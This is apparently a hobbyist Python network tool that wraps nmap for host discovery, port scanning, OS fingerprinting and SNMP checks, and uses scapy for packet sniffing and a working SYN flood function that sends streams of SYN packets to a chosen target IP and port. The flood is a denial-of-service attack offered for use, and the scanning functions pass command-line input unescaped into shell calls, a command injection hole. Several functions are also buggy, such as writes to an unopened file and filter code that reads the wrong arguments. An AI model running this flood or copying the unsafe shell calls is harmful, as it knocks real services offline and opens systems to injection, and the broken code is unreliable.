#!/usr/bin/env python3

import sys
import subprocess as sp
import re
import scapy.all as scapy

ipv4 = '[1-9][0-9]{0,2}\.[1-9][0-9]{0,2}\.[1-9][0-9]{0,2}\.[1-9][0-9]{0,2}'
port = '[1-9][0-9]{0,5}\/[a-zA-Z]{1,5}'
open_port = '[1-9][0-9]{0,5}\/[a-zA-Z]{1,5}[\s]{1,5}open'

# nmap usage: https://www.vjsecurity.net/2021/09/what-is-nmap-uses-and-functions-of-nmap.html

def icmp_ping():
    print('Scanning with nmap...')
    result = sp.getoutput(f'nmap -sn {sys.argv[1]}')
    print()
    print('Scan is done.')
    ip_addresses = re.findall(f"{ipv4}", result)

    with open(f"./icmp.dat", mode="w", encoding="utf-8") as file:
        for ip in ip_addresses:
            file.write(ip + "\n")

def port_identification():
    with open(f"./icmp.dat", mode="r", encoding="utf-8") as file:
        ip_text = file.read()
        ip_addresses = ip_text.split("\n")

    live_hosts = []
    for ip in ip_addresses:
        ip_check = sp.getoutput(f"nmap -Pn {ip}")
        if (re.search("0 hosts up", ip_check)):
            continue
        live_hosts.append(ip)
    with open(f"./ports.dat", mode="w") as file:
        pass

    for ip in live_hosts:
        ports = sp.getoutput(f"nmap -Pn {ip}")
        for line in ports.splitlines():
            if (re.search(f"{port}", line)):
                with open(f"./ports.dat", mode="a", encoding="utf-8") as file:
                    file.write(ip + " " + line.split()[0] + " " +  line.split()[2] + "\n")

def open_port_identification():
    with open(f"./ports.dat", mode="r", encoding="utf-8") as file:
        ports_text = file.read()
        ip_addresses = set(re.findall(f"{ipv4}", ports_text))

    alive_hosts = []
    for ip in ip_addresses:
        ip_check = sp.getoutput(f"nmap -Pn {ip}")
        if (re.search("0 hosts up", ip_check)):
            continue
        alive_hosts.append(ip)

    with open(f"./open_ports.dat", mode="w") as file:
        pass

    for ip in alive_hosts:
        ports = sp.getoutput(f"nmap -Pn {ip}")
        for line in ports.splitlines():
            if (re.search(f"{open_port}", line)):
                with open(f"./open_ports.dat", mode="a", encoding="utf-8") as file:
                    file.write(ip + " " + line.split()[0] + " " +  line.split()[2] + "\n")

def os_fingerprint_idetification():
    # https://nmap.org/book/osdetect-usage.html
    # https://www.geeksforgeeks.org/os-detection-in-nmap-in-kali-linux/
    with open(f"./open_ports.dat", mode="r", encoding="utf-8") as file:
        open_ports_text = file.read()
        ip_addresses = set(re.findall(f"{ipv4}", open_ports_text))

    with open("./os_results.info", mode="w"):
        pass
    
    for ip in ip_addresses:
        os = sp.getoutput(f"nmap -sS {ip} -O")
        print("-"*50)

        if (re.search("No exact OS matches for host", os)):
            os = sp.getoutput(f"nmap -sS {ip} -o --osscan-guess")
            for line in os.splitlines():
                if(line.startswith("Aggressive OS guesses: ")):
                    oses = line[line.index(":")+2:].split(", ")
                    print(f"No exact OS found for {ip}. Here are some guesses:")
                    with open("./os_results.info", mode="a", encoding="utf-8"):
                        file.write("-"*50 + "\n")
                        file.write(f"No exact OS found for {ip}. Here are some guesses:" + "\n")
                    for osp in oses:
                        print(osp)
                        with open("./os_results.info", mode="a", encoding="utf-8") as file:
                            file.write("-"*50 + "\n")
                            file.write(osp + "\n")

        else:
            for line in os.splitlines():
                if(line.startswith("OS details: ")):
                    result=f"For {ip}: " + line[line.index(":")+2:]
                    print(result)
                    with open("./os_results.info", mode="a", encoding="utf-8") as file:
                        file.write(result + "\n")

def router_firewall_identification():
    return 0

def web_server_detection():
    return 0

def snmp_detection():
    snmp = sp.getoutput(f"nmap {sys.argv[1]} -p 161")
    snmp_list = snmp.splitlines()

    cnt=0
    snmp_final=[]

    with open("./snmp.dat",'w') as f:
        pass

    for line in snmp_list:
        cnt+=1
        if(line.startswith("161/tcp open")):
            snmp_final.append(re.findall(ipv4, snmp_list[cnt-5])[0])

            with open("./snmp.dat", mode="a", encoding="utf-8") as file:
                file.write(f"For '{re.findall(ipv4, snmp_list[cnt-5])[0]}' the port '{line.split()[0]}' is an open snmp port.\n")

    if(snmp_final==[]):
        print("No port found on any device with open SNMP protocol.")
        with open("./snmp.dat", mode="w", encoding="utf-8") as file:
            file.write("No port found on any device with open SNMP protocol.")

def show():
    with open(f"./icmp.dat", mode="r", encoding="utf-8") as file:
        icmp_text = file.read()
    print()
    print("icmp.dat file:")
    print(icmp_text)
    print("-"*50)

    with open(f"./ports.dat", mode="r", encoding="utf-8") as file:
        ports = file.read()
    print("ports.dat file:")
    print(ports)
    print("-"*50)

    with open("./open_ports.dat", mode="r", encoding="utf-8") as file:
        open_ports = file.read()
    print("open_ports.dat file:")
    print(open_ports)
    print("-"*50)

    with open("./os_results.info", mode="r", encoding="utf-8") as file:
        os_results = file.read()
    print("os_results.info file:")
    print(os_results)
    print("-"*50)

def syn_flood(target_ip, target_port, packet_num):
    # To a given ip and port send a specific amount of packets.
    # SYN_flood -pT 1-80 193.60.70.5
    # For example, the code above is going to attack all ports
    # between 1 - 80 with the ip "193.60.70.5".
    # https://www.thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

    packet_num = int(packet_num)
    target_port = int(target_port)

    for i in range(packet_num):
        ip = scapy.IP(dst=target_ip)
        tcp = scapy.TCP(sport=scapy.RandShort(), dport=target_port, flags="S")
        raw = scapy.Raw(b"X"*1024)

        p = ip / tcp / raw

        scapy.send(p, verbose=0)
    print(f"{packet_num} number of packets sent to the port {target_port} of {target_ip}.")

def sniff():
    # https://www.geeksforgeeks.org/packet-sniffing-using-scapy/

    fltr=""
    if("s" in options):
        if(fltr==""):
            fltr = fltr + "src " + op_arg["s"]
        else:
            fltr = fltr + " and " + "src " + op_arg["s"]

    if("d" in options):
        if(fltr==""):
            fltr = fltr + "dst " + op_arg["d"] + " "
        else:
            fltr = fltr + " and " + "dst " + op_arg["s"]

    if("p" in options):
        if(fltr==""):
            fltr = fltr + "port " + op_arg["p"] 
        else:
            fltr = fltr + " and " + "port " + op_arg["s"] 

    if(protocol_options!=[]):
        if 'T' in protocol_options:
            if(fltr==""):
                fltr = fltr + "tcp"
            else:
                fltr = fltr + " and " + "tcp"
        if 'U' in protocol_options:
            if(fltr==""):
                fltr = fltr + "udp"
            else:
                fltr = fltr + " and " + "udp"
        if 'I' in protocol_options:
            if(fltr==""):
                fltr = fltr + "icmp"
            else:
                fltr = fltr + " and " + "icmp"

    if(fltr==""):
        if("c" in options):
            capture = scapy.sniff(count=int(op_arg["c"]))
            capture.summary()   
        else:
            capture = scapy.sniff()
            capture.summary()

    else:
        if("c" in options):
            capture = scapy.sniff(count=int(op_arg["c"]), filter=fltr)
            capture.summary()

        else:
            capture = scapy.sniff(filter=fltr)
            capture.summary()

def parse_command(command):
    global options
    global protocol_options
    global op_arg
    if(len(command) != 0 and str(command[0]).startswith("-")):
        options=list(str(command[0]))
        options.remove("-")
        args = command[1:]

        protocol_options=[]
        if 'T' in options:
            protocol_options.append("T")
            options.remove("T")
        if 'U' in options:
            protocol_options.append("U")
            options.remove("U")
        if 'I' in options:
            protocol_options.append("I")
            options.remove("I")

        if(len(args)!=len(options)):
            print("Missing arguments for amount of options that you have entered.")
            return 0
        op_arg = {}

        for i in range(len(args)):
            op_arg[options[i]]=args[i]        
        return 1

    else:
        print("Please enter a valid option.")
        return 0

def main(): # main function
    while(True):
        print("Welcome.")
        print("-"*50)
        print("1.  ICMP Ping")
        print("2.  Port Identification")
        print("3.  Open Port Identification")
        print("4.  OS Fingerprint Identification")
        print("5.  Router & Firewall Detection")
        print("6.  Web Server Detection")
        print("7.  SNMP Detection")
        print("8.  Show")
        print("SYN_flood")
        print("sniff")
        print("11. Exit")
        print("-"*50)
        command = input()

        if (command=="1"):
            icmp_ping()
            continue
        elif (command=="2"):
            port_identification()
            continue
        elif (command=="3"):
            open_port_identification()
            continue
        elif (command=="4"):
            os_fingerprint_idetification()
            continue
        elif (command=="5"):
            router_firewall_identification()
            continue
        elif (command=="6"):
            web_server_detection()
            continue
        elif (command=="7"):
            snmp_detection()
            continue
        elif (command=="8"):
            show()
            continue
        elif (command=="11"):
            exit()

        command = command.split()

        if (command[0]!="sniff" and command[0]!="SYN_flood"):
            print(f"Command '{command[0]}' not found.")
            continue

        elif (command[0]==("SYN_flood")):
            command.remove(command[0])
            if (parse_command(command)==0):
                continue
            elif (parse_command(command)==1):
                parse_command(command)
                print(options)
                print(protocol_options)
                print(op_arg)
                ip = op_arg["d"]
                port = op_arg["p"]
                times = op_arg["t"]
                syn_flood(ip, port, times)

        elif (command[0]==("sniff")):
            command.remove(command[0])
            if (parse_command(command)==0):
                continue
            elif (parse_command(command)==1):
                parse_command(command)
                sniff()
        print()

if __name__ == "__main__":
    main()
